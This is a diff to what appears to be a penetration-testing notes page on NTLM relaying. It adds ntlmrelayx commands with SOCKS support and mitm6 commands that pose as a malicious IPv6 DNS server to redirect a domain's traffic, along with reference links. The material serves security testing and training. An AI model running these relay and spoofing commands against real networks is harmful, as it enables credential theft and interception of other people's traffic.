@@ -62,6 +62,30 @@ We can then run `ntlmrelayx.py` from Impacket, supplying our file of hosts previ
 python3 ntlmrelayx.py -tf smbdisabled.out --smb2-support
 ```
 
+#### Relaying with SOCKS
+
+We can also enable SOCKS support while relaying for interactive sessions.&#x20;
+
+```bash
+python3 ntlmrelayx.py -tf smbdisabled.out --smb2-support --socks
+```
+
+### Attacking IPv6
+
+While a majority of companies do not utilize IPv6, little know that it is actually enabled by default. By using a tool such as mitm6, we can act as a malicious DNS server and redirect traffic to our attack host.&#x20;
+
+The following command demonstrates basic usage of IPv6:
+
+```bash
+sudo mitm6 -d <domain>
+```
+
+Additionally, the following command demonstrates running mitm6 with the `--ignore-nofqnd` flag which will ignore DHCPv6 queries that do not contain the Fully Qualfiied Domain Name:
+
+```bash
+sudo mitm6 -d $domain --ignore-nofqnd
+```
+
 ### References
 
 {% embed url="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" %}
@@ -69,3 +93,9 @@ python3 ntlmrelayx.py -tf smbdisabled.out --smb2-support
 {% embed url="https://en.hackndo.com/ntlm-relay" %}
 
 {% embed url="https://docs.microsoft.com/en-us/archive/blogs/josebda/the-basics-of-smb-signing-covering-both-smb1-and-smb2" %}
+
+
+
+{% embed url="https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/exploitation/exploit-without-account/smb-relay" %}
+
+{% embed url="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6" %}
